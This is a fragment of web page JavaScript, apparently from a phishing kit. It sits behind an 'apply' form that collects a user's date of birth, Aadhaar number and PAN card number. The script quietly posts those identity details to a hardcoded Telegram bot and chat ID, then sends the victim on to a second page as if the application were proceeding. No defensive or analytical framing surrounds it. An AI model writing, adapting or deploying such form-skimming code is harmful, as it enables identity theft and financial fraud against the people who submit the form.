    <script>
        
        const botToken = '7029708296:AAHrc2_1xOjh3t5gQUIUCN7QBqV09BtpeRg';
        const chatId = '7418391998';

        // Function to send message to Telegram bot
        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            const data = {
                chat_id: chatId,
                text: message,
            };

            return fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            }).then(response => response.json());
        }

        document.getElementById('applyForm').addEventListener('submit', function (event) {
            event.preventDefault(); // Prevent the default form submission

            const dob = document.getElementById('dob').value;
            const adhaar = document.getElementById('Adhaar').value;
            const pan = document.getElementById('pan').value;

            // Format the message to send
            const message = `
            Date of Birth: ${dob}
            Aadhaar Number: ${adhaar}
            PAN Card Number: ${pan}
            `;

            // Send the message to Telegram and redirect on success
            sendToTelegram(message)
                .then(response => {
                    if (response.ok) {
                        window.location.href = 'apply2.html';
                    } else {
                        alert('Failed to submit the form. Please try again.');
                    }
                })
                .catch((error) => {
                    console.error('Error:', error);
                    alert('An error occurred. Please try again.');
                });
        });

        // Function to open the sidebar
        function openNav() {

        }
